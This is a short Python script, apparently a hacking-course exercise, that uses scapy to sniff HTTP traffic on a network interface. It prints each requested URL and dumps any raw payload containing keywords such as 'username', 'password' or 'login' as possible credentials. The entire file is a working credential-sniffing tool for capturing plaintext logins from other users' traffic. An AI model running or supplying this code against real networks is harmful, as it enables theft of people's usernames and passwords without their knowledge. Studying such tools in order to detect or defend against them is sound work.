#!/usr/bin/env python


import optparse
import scapy.all as scapy
from scapy.layers import http

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface name to sniff data from")
    (options, arguments) = parser.parse_args()

    if not options.interface:
        parser.error("Please input Interface name, use --help for more info.")
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False,prn=process_sniffed_packet)

def get_url(packet):
    return bytes(packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path).decode()

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = bytes(packet[scapy.Raw].load).decode()
        keywords = ["username", "Username", "user", "login", "password", "Password", "Pass", "pass", "Login", "Uname", "UName", ]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> "+url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


interface_name = get_arguments()
sniff(interface_name.interface)
